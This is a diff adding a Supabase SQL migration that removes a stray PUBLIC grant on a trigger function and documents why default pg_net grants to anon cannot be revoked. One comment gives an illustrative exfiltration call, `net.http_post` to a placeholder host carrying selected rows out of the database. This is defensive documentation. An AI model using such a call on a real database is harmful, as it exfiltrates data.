@@ -1,0 +1,104 @@
+-- ===========================================================================
+-- Home Church, one grant closed and one that cannot be
+--
+-- Two default grants nobody asked for. Neither is reachable today. One is now
+-- closed; the other turns out not to be ours to close, and the second half of
+-- this file is the write-up of why, so that the next person to notice it does
+-- not spend an afternoon rediscovering it.
+--
+-- HOW TO RUN IT
+--   Supabase dashboard -> SQL Editor -> New query -> paste -> Run.
+--   Depends on nothing. Safe to run more than once.
+-- ===========================================================================
+
+
+-- ---------------------------------------------------------------------------
+-- 1. hc_sync_between_seasons_note, away from PUBLIC.  THIS ONE WORKS.
+--
+-- Every other function in this project is revoked from public and then granted
+-- to exactly who needs it. This one was created and never revoked, so it
+-- carried `=X/postgres`, the EXECUTE that PUBLIC gets for free. It was the
+-- only function here that did.
+--
+-- IT WAS NEVER CALLABLE AND THIS CHANGES NOTHING FUNCTIONAL. It returns
+-- `trigger`. Postgres refuses to invoke a trigger function directly and
+-- PostgREST will not expose one at all, so the grant never meant anything.
+--
+-- IT IS STILL WORTH REMOVING, for a reason that has nothing to do with
+-- attackers: it was the sole anon_security_definer_function_executable in the
+-- advisor's list that was there by accident rather than by decision. The other
+-- entries are load bearing, and 0018 and 0037 argue for each at length. A list
+-- where every entry is deliberate gets read the next time it changes. A list
+-- with one piece of litter in it gets skimmed, and the entry that matters gets
+-- skimmed with it.
+--
+-- Verified after applying: proacl is now {postgres=X/postgres,
+-- service_role=X/postgres}. The bare `=X` is gone.
+-- ---------------------------------------------------------------------------
+
+revoke execute on function public.hc_sync_between_seasons_note()
+  from public, anon, authenticated;
+
+comment on function public.hc_sync_between_seasons_note() is
+  'Trigger function for church_profile. Not directly callable, and since 0057 not granted to PUBLIC either, so it no longer appears in the advisor as an accident.';
+
+
+-- ---------------------------------------------------------------------------
+-- 2. pg_net, which we cannot take away from anon.  NO SQL HERE ON PURPOSE.
+--
+-- WHAT IS THERE. Schema `net` carries USAGE for anon and authenticated, and
+-- net.http_get, net.http_post and net.http_delete carry the PUBLIC EXECUTE a
+-- function is born with. On paper, the two roles a phone can hold may make
+-- arbitrary outbound HTTP requests from inside the database.
+--
+-- It is Supabase's default. This project never granted it, and calls pg_net in
+-- seven places, every one inside a SECURITY DEFINER function that runs as its
+-- owner and so consults nobody's grants: hc_push_tick, hc_newsletter_tick,
+-- hc_dedupe_tick, hc_event_dedupe_tick, hc_send_push,
+-- hc_admin_send_announcement and hc_admin_refresh_group_status.
+--
+-- WHY IT IS NOT A HOLE. PostgREST only exposes the schemas it is configured
+-- with, which here is the stock `public, graphql_public, storage`. `net` is
+-- not among them, so there is no /rest/v1/rpc/http_post to reach. The grant is
+-- unreachable, not merely unused. Checked, rather than assumed: pgrst.db_schemas
+-- is unset at the database level, so the platform default stands.
+--
+-- WHY IT WOULD STILL BE WORTH CLOSING, if we could. Not for what it does, for
+-- what it would multiply. Every definer function here builds SQL with
+-- parameters or format(%I) and never by concatenating a caller's string, so
+-- there is no injection to find. If one were ever introduced, the damage with
+-- this grant standing is not "somebody read rows they should not have"; it is
+-- a `select net.http_post('https://not-ours/', ...)` carrying whatever they
+-- selected, out of the database, asynchronously, response discarded, nothing
+-- in an app log to notice. That is the difference between a leak and a pipe.
+--
+-- WHY THE REVOKE IS NOT WRITTEN ABOVE. Because it does not work, and a
+-- migration that appears to close something it has not closed is worse than no
+-- migration at all: it converts an open question into a false belief.
+--
+--   revoke usage on schema net from anon, authenticated;
+--   revoke execute on all functions in schema net from public, anon, authenticated;
+--
+-- Both statements run. Both report success. Neither changes anything. Postgres
+-- only lets you revoke a grant you made, and these were made by
+-- `supabase_admin`, while the dashboard SQL editor, the MCP server and every
+-- other route the project owner has all connect as `postgres`. Confirmed on
+-- this project:
+--
+--   current_user                 postgres
+--   member of supabase_admin     false
+--   superuser                    false
+--
+-- So the revoke is a silent no-op, and re-reading proacl afterwards still
+-- shows `=X/supabase_admin` on the http functions and `anon=U` on the schema.
+--
+-- WHAT WOULD ACTUALLY CHANGE IT: a request to Supabase support, who hold
+-- supabase_admin. Worth doing at some point; not worth blocking a release on,
+-- given the exposure is unreachable and the amplifier only matters if an
+-- injection is introduced elsewhere first.
+--
+-- WHAT TO DO INSTEAD, and it is the part that genuinely protects us: keep the
+-- injection surface at zero. No `execute 'string' || variable` anywhere, ever.
+-- format() with %I and %L only. That rule is what makes this grant academic,
+-- and it is a rule this project already keeps everywhere.
+-- ---------------------------------------------------------------------------
